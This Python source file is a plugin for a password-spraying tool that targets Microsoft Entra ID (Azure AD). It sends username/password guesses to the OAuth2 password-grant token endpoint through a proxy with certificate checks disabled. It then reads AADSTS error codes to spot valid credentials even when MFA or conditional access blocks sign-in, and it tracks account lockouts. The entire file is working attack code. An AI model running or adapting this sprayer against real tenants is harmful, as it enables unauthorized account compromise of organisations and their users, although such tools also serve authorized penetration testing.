"""Microsoft Entra ID / Azure AD target plugin."""
import requests
from urllib3.exceptions import InsecureRequestWarning

from .base import TargetPlugin, SprayResult

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Entra ID error codes -> human-readable verdicts
# https://learn.microsoft.com/en-us/entra/identity-platform/reference-error-codes
AADSTS_CODES = {
    "AADSTS50126": ("invalid_password", "Valid user, invalid password"),
    "AADSTS50055": ("password_expired", "Password expired — VALID CREDS"),
    "AADSTS50079": ("mfa_not_configured", "MFA required but not configured — VALID CREDS"),
    "AADSTS53004": ("mfa_registration_needed", "Must complete MFA registration — VALID CREDS"),
    "AADSTS50076": ("mfa_microsoft", "Microsoft MFA enforced — VALID CREDS"),
    "AADSTS50158": ("mfa_conditional", "Conditional access MFA (DUO/other) — VALID CREDS"),
    "AADSTS53003": ("conditional_access_blocked", "Conditional access blocks token — VALID CREDS"),
    "AADSTS53000": ("device_compliance", "Requires compliant device — VALID CREDS"),
    "AADSTS530035": ("security_defaults", "Blocked by security defaults — VALID CREDS"),
    "AADSTS50128": ("invalid_tenant", "Invalid tenant — check domain"),
    "AADSTS50059": ("invalid_tenant", "Invalid tenant — check domain"),
    "AADSTS50034": ("user_not_found", "User does not exist"),
    "AADSTS500011": ("invalid_resource", "Resource not found in tenant"),
    "AADSTS700016": ("invalid_app", "Application not found in tenant"),
    "AADSTS50053": ("account_locked", "Account locked (smart lockout)"),
    "AADSTS50057": ("account_disabled", "Account disabled"),
}


class MicrosoftTarget(TargetPlugin):
    """Microsoft Entra ID (Azure AD) OAuth2 ROPC spray target."""

    name = "microsoft"
    description = "Microsoft Entra ID via OAuth2 Resource Owner Password Credentials"

    DEFAULT_CLIENT_ID = "1b730954-1685-4b74-9bfd-dac224a7b894"
    DEFAULT_RESOURCE = "https://graph.windows.net"

    def __init__(self, proxy_url: str = "http://changeme:changeme@127.0.0.1:1234",
                 client_id: str = None, resource: str = None):
        super().__init__(proxy_url)
        self.client_id = client_id or self.DEFAULT_CLIENT_ID
        self.resource = resource or self.DEFAULT_RESOURCE

    def spray(self, username: str, password: str) -> SprayResult:
        url = "https://login.microsoft.com/common/oauth2/token"
        data = {
            "resource": self.resource,
            "client_id": self.client_id,
            "client_info": "1",
            "grant_type": "password",
            "username": username,
            "password": password,
            "scope": "openid",
        }
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        try:
            resp = requests.post(
                url,
                proxies=self.proxies,
                headers=headers,
                data=data,
                timeout=10,
                verify=False,
            )
            return SprayResult(
                username=username,
                password=password,
                status_code=resp.status_code,
                response=resp.text,
                target=self.name,
            )
        except requests.RequestException as e:
            return SprayResult(
                username=username,
                password=password,
                status_code=0,
                response=f"Connection error: {e}",
                target=self.name,
            )

    def parse_response(self, result: SprayResult) -> dict:
        parsed = {
            "username": result.username,
            "password": result.password,
            "status_code": result.status_code,
            "target": self.name,
            "verdict": "unknown",
            "detail": "",
            "valid_creds": False,
            "needs_attention": False,
        }

        if result.status_code == 200:
            parsed["verdict"] = "success"
            parsed["detail"] = "Authentication successful — full access"
            parsed["valid_creds"] = True
            parsed["needs_attention"] = True
            return parsed

        if result.status_code == 0:
            parsed["verdict"] = "connection_error"
            parsed["detail"] = result.response
            return parsed

        for code, (verdict, detail) in AADSTS_CODES.items():
            if code in result.response:
                parsed["verdict"] = verdict
                parsed["detail"] = detail
                parsed["valid_creds"] = "VALID CREDS" in detail
                parsed["needs_attention"] = parsed["valid_creds"] or verdict == "account_locked"
                return parsed

        parsed["verdict"] = "unknown_error"
        parsed["detail"] = result.response[:200]
        return parsed
